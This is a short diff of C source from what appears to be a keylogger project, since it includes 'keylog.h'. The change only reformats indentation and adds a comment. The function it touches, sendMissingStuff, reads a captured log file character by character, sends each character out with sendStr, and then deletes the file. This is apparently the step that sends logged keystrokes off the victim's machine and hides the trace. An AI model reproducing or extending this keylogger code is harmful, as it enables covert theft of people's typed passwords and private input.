@@ -14,16 +14,18 @@
 #include "keylog.h"
 
 int sendMissingStuff() {
-		char c;
-		char s[2];
-		openFile(filename);
-		while( (c = getc(fd)) != EOF ) {
-			s[0] = c;
-			s[1] = '\0';
-			sendStr(s);
-		}
-		closeFile();
-		remove(filename);
+	char c;
+	char s[2];
+	openFile(filename);
+	while( (c = getc(fd)) != EOF ) {
+		s[0] = c;
+		s[1] = '\0';
+		sendStr(s);
+	}
+	closeFile();
+
+	// delete file (is no longer needed)
+	remove(filename);
 	return 1;
 }
 
